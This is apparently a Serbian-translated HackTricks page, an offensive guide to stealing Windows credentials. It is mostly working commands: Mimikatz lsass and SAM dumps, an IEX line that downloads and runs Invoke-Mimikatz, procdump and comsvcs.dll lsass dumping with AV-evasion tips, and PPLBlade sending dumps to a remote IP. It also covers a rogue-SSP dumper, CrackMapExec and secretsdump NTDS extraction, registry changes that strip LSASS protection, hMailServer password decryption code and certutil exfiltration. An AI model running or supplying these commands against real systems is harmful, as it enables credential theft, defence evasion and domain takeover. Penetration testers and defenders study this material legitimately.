# Krađa Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da uradi na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke credentials.**

## Credentials with Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da **pretražite passwords i hashes** unutar victim.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV

### Procdump + Mimikatz

Pošto je **Procdump from** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitiman Microsoft alat**, ne detektuje ga Defender.\
Možete koristiti ovaj alat da **dump the lsass process**, **download the dump** i **extract** **credentials locally** iz dump-a.

Takođe možete koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se automatski izvršava pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Neki **AV** mogu **detektovati** i označiti kao **maliciozno** korišćenje **procdump.exe to dump lsass.exe**, ovo je zato što detektuju string **"procdump.exe" and "lsass.exe"**. Zato je **diskretnije** **proslediti** kao **argument** **PID** procesa lsass.exe procdump-u **umesto** imena **lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
Nije bitno šta se koristi u prva dva argumenta, ali treći je podeljen na tri komponente. PID procesa koji treba da bude dump-ovan predstavlja prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta je striktno reč **full**. Nema alternativnih opcija.\
Nakon parsiranja ovih triju komponenti, DLL kreira dump fajl i prebacuje memoriju navedenog procesa u taj fajl.\
Korišćenje **comsvcs.dll** je moguće za dump-ovanje procesa lsass, čime se eliminiše potreba za upload-ovanjem i izvršavanjem procdump. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Sledeća komanda se koristi za izvršenje:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass pomoću Task Manager-a**

1. Kliknite desnim tasterom na Task Bar i izaberite Task Manager
2. Kliknite na More details
3. Potražite proces "Local Security Authority Process" na kartici Processes
4. Kliknite desnim tasterom na proces "Local Security Authority Process" i izaberite "Create dump file".

### Dumping lsass pomoću procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarni fajl potpisan od strane Microsoft-a koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za Protected Process Dumper koji podržava obfuskaciju memory dump-a i njihovo prebacivanje na remote workstations bez zapisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump fajlova kako bi se izbegli Defender mehanizmi detekcije zasnovani na potpisima
3. Otpremanje memory dump-a koristeći RAW i SMB metode upload-a bez zapisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon isporučuje trostepeni dumper nazvan **LalsDumper** koji nikad ne poziva `MiniDumpWriteDump`, pa EDR hooks na taj API nikad ne aktiviraju:

1. **Stage 1 loader (`lals.exe`)** – traži `fdp.dll` za placeholder koji se sastoji od 32 mala slova `d`, prepisuje ga apsolutnom putanjom do `rtu.txt`, sačuva ispravljeni DLL kao `nfdp.dll`, i pozove `AddSecurityPackageA("nfdp","fdp")`. To prisiljava **LSASS** da učita zlonamerni DLL kao novi Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20`, i mapira dekodovani blob u memoriju pre nego što prebaci izvršenje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** rešene iz hashed API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedicated export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, streamuje kompresovani LSASS dump u fajl i zatvara handle tako da exfiltration može da se izvrši kasnije.

Operator notes:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll`, i `rtu.txt` u istom direktorijumu. Stage 1 prepisuje hardkodirani placeholder apsolutnom putanjom do `rtu.txt`, tako da njihovo razdvajanje prekida lanac.
* Registracija se vrši dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Možete sami postaviti tu vrednost da biste naterali LSASS da pri svakom bootu ponovo učita SSP.
* `%TEMP%\*.ddt` fajlovi su kompresovani dumpovi. Dekomprimiujte lokalno, pa ih prosledite Mimikatz/Volatility za ekstrakciju kredencijala.
* Pokretanje `lals.exe` zahteva admin/SeTcb prava kako bi `AddSecurityPackageA` uspelo; nakon što poziv vrati kontrolu, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ga ne izbriše iz LSASS-a. Ili obrišite registry entry i restartujte LSASS (reboot) ili ga ostavite za dugoročnu persistenciju.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit sa target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izdvojite istoriju lozinki iz NTDS.dit sa ciljnog DC-a
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ove datoteke bi trebalo da budu **smeštene** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM_. Ali **ne možete ih jednostavno kopirati na uobičajen način** zato što su zaštićene.

### Iz registra

Najlakši način da ukradete te datoteke je da dobijete kopiju iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** te datoteke na svoj Kali računar i **extract the hashes** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete kopirati zaštićene fajlove koristeći ovu uslugu. Potrebno je da budete Administrator.

#### Using vssadmin

vssadmin binary je dostupan samo u verzijama Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell**. Ovo je primer **kako kopirati SAM file** (korisćen hard disk je "C:" i sačuvano je u C:\users\Public), ali ovo možete koristiti za kopiranje bilo koje zaštićene datoteke:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Konačno, takođe možete koristiti [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Fajl **NTDS.dit** je poznat kao srce **Active Directory**, sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. Tu su sačuvani **password hashes** za domain korisnike. Ovaj fajl je **Extensible Storage Engine (ESE)** baza podataka i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri glavne tabele:

- **Data Table**: Ova tabela čuva informacije o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: Ovdje se nalaze **Security descriptors** za svaki objekat, obezbeđujući sigurnost i kontrolu pristupa za sačuvane objekte.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom i on je korišćen od strane _lsass.exe_. Zbog toga, **deo** fajla **NTDS.dit** može se nalaziti **unutar memorije `lsass`** (možete pronaći najnovije pristupane podatke verovatno zbog poboljšanja performansi korišćenjem **cache**).

#### Dekriptovanje hash-ova unutar NTDS.dit

Hash je šifrovan 3 puta:

1. Dekriptirajte Password Encryption Key (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dekriptirajte **hash** koristeći **PEK** i **RC4**.
3. Dekriptirajte **hash** koristeći **DES**.

**PEK** ima **istu vrednost** u **svakom domain controller-u**, ali je **šifrovan** unutar fajla **NTDS.dit** koristeći **BOOTKEY** SYSTEM fajla domain controller-a (različit između domain controller-a). Zato, da biste dobili kredencijale iz NTDS.dit fajla **trebate fajlove NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit koristeći Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Možete takođe koristiti [**volume shadow copy**](#stealing-sam-and-system) trik да копирате **ntds.dit** фајл. Запамтите да ће вам такође требати копија фајла **SYSTEM** (опет, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trik).

### **Izdvajanje hashes iz NTDS.dit**

Када сте **дobili** фајлове **NTDS.dit** и **SYSTEM**, можете користити алате као што је _secretsdump.py_ да **izvučete hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Takođe ih možete **izvući automatski** koristeći validan domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit fajlove** preporučuje se njihova ekstrakcija pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Takođe možete koristiti **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcija objekata domena iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu biti ekstrahovani u SQLite bazu pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izvlače se ne samo poverljivi podaci, već i kompletni objekti i njihovi atributi za dalju analizu informacija kada je sirovi NTDS.dit fajl već pribavljen.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opciona, ali omogućava dešifrovanje tajni (NT & LM hashes, supplemental credentials kao što su cleartext passwords, kerberos ili trust keys, NT & LM password histories). Pored ostalih informacija, izvučeni su sledeći podaci : korisnički i mašinski nalozi sa njihovim hash-ovima, UAC flags, vremenska oznaka poslednjeg logona i promene lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, trusted domains sa trusts type, direction i attributes...

## Lazagne

Preuzmite binarni fajl sa [here](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju credentials iz više softvera.
```
lazagne.exe all
```
## Ostali alati za izvlačenje kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvlači kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izvucite credentials iz SAM fajla
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **pokrenite ga** i lozinke će biti izvučene.

## Istraživanje neaktivnih RDP sesija i slabljenje sigurnosnih kontrola

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker čije su tehnike korisne za bilo kog red-teamer-a:

### DumpRDPHistory-style prikupljanje telemetrije

* **Outbound RDP targets** – parsirajte svaki user hive na `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podkljuć čuva ime servera, `UsernameHint`, i timestamp poslednjeg zapisa. Možete replicirati FinalDraft-ovu logiku pomoću PowerShell-a:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – pretražite `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log za Event IDs **21** (successful logon) i **25** (disconnect) da mapirate ko je administrirao mašinu:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada saznate koji Domain Admin redovno povezuje, dumpujte LSASS (with LalsDumper/Mimikatz) dok njihova **disconnected** sesija još postoji. CredSSP + NTLM fallback ostavlja njihov verifier i tokene u LSASS, koji se zatim mogu replay-ovati preko SMB/WinRM da biste preuzeli `NTDS.dit` ili postavili persistence na domain controllers.

### Registry downgrades targeted by FinalDraft

Isti implant takođe manipuliše nekoliko registry ključeva kako bi olakšao credential theft:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Podešavanje `DisableRestrictedAdmin=1` prisiljava full credential/ticket reuse tokom RDP-a, omogućavajući pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC token filtering, pa lokalni admini dobijaju unrestricted tokens preko mreže.
* `DSRMAdminLogonBehavior=2` dozvoljava DSRM administratoru prijavu dok je DC online, dajući napadačima još jedan ugrađen high-privilege account.
* `RunAsPPL=0` uklanja LSASS PPL protections, što čini pristup memoriji trivijalnim za dumpere kao što je LalsDumper.

## hMailServer kredencijali baze podataka (post-compromise)

hMailServer čuva svoju DB lozinku u `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` pod `[Database] Password=`. Vrednost je Blowfish-encrypted sa statičkim ključem `THIS_KEY_IS_NOT_SECRET` i 4-byte word endianness swaps. Koristite hex string iz INI sa ovim Python snippetom:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Kopirajte SQL CE database (koristeći clear-text password) da izbegnete file locks, učitajte 32-bit provider i nadogradite ako je potrebno pre nego što upitujete hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolona `accountpassword` koristi hMailServer hash format (hashcat mode `1421`). Razbijanje ovih vrednosti može obezbediti ponovo upotrebljive kredencijale za WinRM/SSH pivote.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Neki alati presreću **plaintext lozinke za prijavu** tako što presretnu LSA logon callback `LsaApLogonUserEx2`. Ideja je da se hook-uje ili wrap-uje authentication package callback tako da se kredencijali uhvate **tokom prijave** (pre heširanja), a zatim upišu na disk ili vrate operatoru. Ovo se obično implementira kao pomoćni modul koji se injektuje u LSA ili registruje kod LSA, i zatim beleži svaki uspešan interaktivni/mrežni događaj prijave sa korisničkim imenom, domenom i lozinkom.

Operativne napomene:
- Zahteva local admin/SYSTEM da učita pomoćni modul u authentication path.
- Uhvaćeni kredencijali se pojavljuju samo kada dođe do prijave (interaktivna, RDP, servisna ili mrežna prijava, u zavisnosti od hook-a).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva sačuvane informacije o konekcijama u per-user `sqlstudio.bin` fajlu. Specijalizovani dumperi mogu parsirati fajl i oporaviti sačuvane SQL kredencijale. U shell-ovima koji vraćaju samo izlaz komandi, fajl se često eksfiltrira enkodiranjem u Base64 i ispisivanjem na stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Na strani operatera, ponovo izgradite datoteku i pokrenite dumper lokalno da biste povratili podatke za prijavu:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Reference

- [Unit 42 – Istraga o godinama neotkrivenih operacija koje su ciljale sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Unutar Ink Dragon-a: Otkrivanje relejne mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
